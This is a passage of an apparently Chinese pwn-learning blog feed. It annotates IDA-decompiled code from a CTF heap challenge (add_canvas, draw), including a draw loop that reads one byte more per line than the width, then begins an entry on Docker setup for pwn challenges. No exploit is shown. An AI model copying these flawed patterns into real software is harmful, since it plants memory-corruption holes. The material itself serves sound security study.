class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 &lt;span class=&#34;title function_&#34;&gt;add_canvas&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __int64 v0; &lt;span class=&#34;comment&#34;&gt;// rbx&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v2; &lt;span class=&#34;comment&#34;&gt;// [rsp+Ch] [rbp-24h] BYREF&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v3; &lt;span class=&#34;comment&#34;&gt;// [rsp+10h] [rbp-20h] BYREF&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; idx; &lt;span class=&#34;comment&#34;&gt;// [rsp+14h] [rbp-1Ch]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 v5; &lt;span class=&#34;comment&#34;&gt;// [rsp+18h] [rbp-18h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v5 = __readfsqword(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;u);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  idx = read_idx();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( canvas[idx] )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Invalid index&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    canvas[idx] = &lt;span class=&#34;built_in&#34;&gt;malloc&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0x20&lt;/span&gt;uLL); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    v2 = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    v3 = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Enter canvas width (1-255): &amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    __isoc99_scanf(&lt;span class=&#34;string&#34;&gt;&amp;quot;%hhd&amp;quot;&lt;/span&gt;, &amp;amp;v2);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Enter canvas height (1-255): &amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    __isoc99_scanf(&lt;span class=&#34;string&#34;&gt;&amp;quot;%hhd&amp;quot;&lt;/span&gt;, &amp;amp;v3);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;)(v2 * v3) &amp;lt;= &lt;span class=&#34;number&#34;&gt;0xFF&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      v0 = canvas[idx]; &lt;span class=&#34;comment&#34;&gt;//v0获取canvas画布的堆块的地址,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      *(_QWORD *)(v0 + &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;) = &lt;span class=&#34;built_in&#34;&gt;malloc&lt;/span&gt;((&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;)(v2 * v3 + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;//v0+8,然后强制类型转换,再解引用,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;//_QWORD 64位    word&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      *(_BYTE *)canvas[idx] = v2; &lt;span class=&#34;comment&#34;&gt;// canvas这里也是QWORD类型(其实可以统一替换成v0的&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      *(_BYTE *)(canvas[idx] + &lt;span class=&#34;number&#34;&gt;1LL&lt;/span&gt;) = v3;&lt;span class=&#34;comment&#34;&gt;// 所以+1 是+1 byte&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      *(_DWORD *)(canvas[idx] + &lt;span class=&#34;number&#34;&gt;16LL&lt;/span&gt;) = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      *(_QWORD *)(canvas[idx] + &lt;span class=&#34;number&#34;&gt;24LL&lt;/span&gt;) = &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Done&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Too big&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;built_in&#34;&gt;free&lt;/span&gt;((&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; *)canvas[idx]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      canvas[idx] = &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; v5 - __readfsqword(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;u);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;chatgpt&lt;/p&gt;
&lt;p&gt;在 IDA Pro 中，”_DWORD”、”_QWORD”、”_BYTE” 等标识符通常表示不同的数据类型或数据大小，用于帮助分析和标识反汇编代码中的数据。这些标识符通常与数据类型的大小有关，以下是它们的一般含义：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;“_DWORD”：代表一个32位的双字（Double Word），通常对应于一个32位整数。在汇编和反汇编中，双字通常由4个字节组成。&lt;/li&gt;
&lt;li&gt;“_QWORD”：代表一个64位的四字（Quad Word），通常对应于一个64位整数。在汇编和反汇编中，四字通常由8个字节组成。&lt;/li&gt;
&lt;li&gt;“_BYTE”：代表一个8位的字节（Byte），通常对应于一个字节。在汇编和反汇编中，字节通常由一个字节组成，用于表示较小的数据。&lt;/li&gt;
&lt;li&gt;字是16位(历史原因、兼容原因……….)&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;画堆块&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;+---------+----------+--------------------+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|                    |                    |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|                    |    chunk head      |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|                    |                    |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;+---------+----------+-----------------+--+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;+---------+----------+--------------------+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|                    |                    |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|          v3   v2   | v0+&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;malloc&lt;/span&gt; canvas |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|                    |                    |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;+---------+----------+-----------------+--+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; +---------+----------+--------------------+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|                    |                    |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|                    |                 |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|                    |                    |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;+---------+----------+-----------------+--+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 画布&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;





&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;draw&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; result; &lt;span class=&#34;comment&#34;&gt;// eax&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i; &lt;span class=&#34;comment&#34;&gt;// [rsp+8h] [rbp-8h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; idx; &lt;span class=&#34;comment&#34;&gt;// [rsp+Ch] [rbp-4h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  idx = read_idx();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( !canvas[idx] )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Invalid index&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Enter your picture (`width` chars in `height` lines): &amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; ( i = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; ; ++i )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    result = *(&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int8 *)(canvas[idx] + &lt;span class=&#34;number&#34;&gt;1LL&lt;/span&gt;); &lt;span class=&#34;comment&#34;&gt;//height&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( i &amp;gt;= result )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    read( &lt;span class=&#34;comment&#34;&gt;//画一行 width&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      (&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; *)(*(_QWORD *)(canvas[idx] + &lt;span class=&#34;number&#34;&gt;8LL&lt;/span&gt;) + i * *(&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int8 *)canvas[idx]),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      *(&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int8 *)canvas[idx] + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;span class=&#34;comment&#34;&gt;// *(_QWORD *)(canvas[idx] + 8LL) 是画布的地址,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;//i * *(unsigned __int8 *)canvas[idx] 是i * 宽&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;//*(unsigned __int8 *)canvas[idx] + 1 是先取了宽,然后+1,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// 所以输入0 8 1 的话,就是读入一行,读入9个字符(包括结束符号)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// 读入地址就是开头呀&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; result;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;0 8 1&lt;/p&gt;
&lt;p&gt;结束符号EOF包括\n \0?&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;函数名&lt;/strong&gt;：read&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;头文件&lt;/strong&gt;：&amp;lt;io.h&amp;gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;函数原型&lt;/strong&gt;： int read(int handle,void *buf,int len);&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;功能&lt;/strong&gt;：用于读取打开文件的内容&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;参数&lt;/strong&gt;：int handle 为要读取的文件&lt;/p&gt;
&lt;p&gt;​     void *buf 为要将读取的内容保存的缓冲区&lt;/p&gt;
&lt;p&gt;​     int len  读取文件的长度&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;返回值&lt;/strong&gt;：返回实际读取的字节数&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *canvas[&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *str;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; addr;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    canvas[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;] = &lt;span class=&#34;built_in&#34;&gt;malloc&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0x20&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    addr = canvas[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    addr = &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;指针和long int存储的有区别吗? 有区别的,&lt;/p&gt;
&lt;p&gt;如果是long int的话&lt;/p&gt;
&lt;p&gt;*(uintptr_t *)(x+8) &amp;#x3D; malloc(0x30); 先把地址+8,然后强制类型转换成指针,然后解引用&lt;/p&gt;
</content>
        <category term="PWN入门" />
        <updated>2023-09-28T09:26:19.000Z</updated>
    </entry>
    <entry>
        <id>https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-39-docker%E5%85%A5%E9%97%A8%E5%8F%8Apwn%E5%87%BA%E9%A2%98%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</id>
        <title>pwn入门-39-docker入门及pwn出题环境搭建</title>
        <link rel="alternate" href="https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-39-docker%E5%85%A5%E9%97%A8%E5%8F%8Apwn%E5%87%BA%E9%A2%98%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
        <content type="html">&lt;h1 id=&#34;docker&#34;&gt;&lt;a href=&#34;#docker&#34; class=&#34;headerlink&#34; title=&#34;docker&#34;&gt;&lt;/a&gt;docker&lt;/h1&gt;&lt;p&gt;入门参考资料:&lt;a href=&#34;https://www.runoob.com/docker&#34;&gt;https://www.runoob.com/docker&lt;/a&gt;&lt;/p&gt;
